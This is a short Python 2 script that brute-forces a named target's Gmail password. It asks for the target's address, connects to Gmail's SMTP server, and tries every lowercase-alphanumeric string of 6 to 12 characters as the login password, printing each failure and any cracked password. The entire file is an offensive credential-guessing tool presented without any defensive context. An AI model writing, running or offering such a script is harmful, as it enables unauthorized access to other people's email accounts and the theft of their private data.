import itertools 
import smtplib 
import time

smtpserver = smtplib.SMTP("smtp.gmail.com", 587) 
smtpserver.ehlo() 
smtpserver.starttls() 
user = raw_input("Enter Target's Gmail Address: ") 

for n in range(6, 12+1): 
   for perm in itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n): 
         password = ''.join(perm)
         
         try: 
             smtpserver.login(user, password) 
             print "[+] Password Cracked: %s" % password
         except smtplib.SMTPAuthenticationError: 
             print "[!] Password Inccorect: %s" % password
